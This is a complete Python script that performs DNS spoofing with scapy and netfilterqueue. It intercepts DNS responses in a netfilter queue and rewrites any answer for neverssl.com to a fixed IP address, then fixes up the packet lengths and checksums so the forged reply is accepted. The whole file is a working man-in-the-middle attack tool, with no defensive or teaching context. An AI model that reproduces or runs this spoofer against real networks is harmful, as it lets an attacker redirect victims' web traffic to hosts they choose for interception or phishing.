from scapy.all import *
from netfilterqueue import NetfilterQueue

target = b"neverssl.com."                    
ip_lala = "142.250.193.142"                   

def process_packet(packet):
    scapy_pkt = IP(packet.get_payload())

    if scapy_pkt.haslayer(DNSRR):
        qname = scapy_pkt[DNSQR].qname

        if target in qname:
            print(f"[+] Spoofing: {qname.decode()} ➜ {ip_lala}")

            answer = DNSRR(rrname=qname, rdata=ip_lala)
            scapy_pkt[DNS].an = answer
            scapy_pkt[DNS].ancount = 1
            scapy_pkt[DNS].ar = None
            scapy_pkt[DNS].ns = None

            del scapy_pkt[IP].len
            del scapy_pkt[IP].chksum
            del scapy_pkt[UDP].len
            del scapy_pkt[UDP].chksum

            packet.set_payload(bytes(scapy_pkt))

    packet.accept()

queue = NetfilterQueue()
queue.bind(0, process_packet)

try:
    print("[+] DNS Spoofing started... Press CTRL+C to stop")
    queue.run()
except KeyboardInterrupt:
    print("\n[!] Quitting and cleaning up...")
